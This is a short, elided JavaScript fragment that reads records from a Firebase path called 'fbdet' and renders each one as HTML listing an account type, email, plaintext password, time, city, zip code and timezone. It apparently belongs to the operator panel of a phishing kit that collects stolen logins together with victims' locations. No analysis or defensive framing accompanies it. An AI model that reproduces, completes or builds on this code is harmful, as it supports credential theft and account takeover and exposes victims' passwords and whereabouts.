Secondarydatabase.ref("fbdet").on('child_added', (snapshot) => {
    ...
    html += "<p><b>Account Type: </b>"+snapshot.val().detailtype+"</p>";
    html += "<p><b>Email: </b>"+snapshot.val().email+"</p>";
    html += "<p><b>Password: </b>"+snapshot.val().password+"</p>";
    html += "<p><b>Time: </b>"+snapshot.val().Time+"</p>";
    html += "<p><b>Locality Area(Zip-Code): </b>"+snapshot.val().cityName+"("+snapshot.val().zipCode+")</p>";
    ...
    html += "<p><b>Timezone: </b>"+snapshot.val().continent+"/"+snapshot.val().countryName+"</p>";
    html += "<p>";
